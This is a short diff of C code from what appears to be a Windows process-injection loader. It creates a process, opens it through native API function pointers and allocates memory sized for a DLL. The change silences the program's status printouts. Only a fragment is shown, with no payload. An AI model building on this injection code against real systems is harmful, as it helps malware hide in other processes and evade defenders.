@@ -296,11 +296,11 @@ int main(int argc , char **argv){
             &pi                  // Pointer to PROCESS_INFORMATION
         ) == 0) {
         // If CreateProcessA fails
-        printf("CreateProcess failed with error code: %lu\n", GetLastError());
+        //printf("CreateProcess failed with error code: %lu\n", GetLastError());
         return 1;
     }
     // Successfully created the process
-    printf("Process created successfully. PID: %lu\n", pi.dwProcessId);
+    //printf("Process created successfully. PID: %lu\n", pi.dwProcessId);
 	
 	
 	CLIENT_ID CID;
@@ -312,13 +312,8 @@ int main(int argc , char **argv){
 	Object_Attr.Length = sizeof(ObjectAttributes);
 
 	
-
-	
 	hProcess = get_proc_handle(CID,Object_Attr,NT_OpenProcess);
-	
-	
-	
-	
+		
 	
     if ( !allocate_mem(hProcess,&Buffer,dll_size,NT_VirtualAlloc) ){
 		goto CLEANUP;
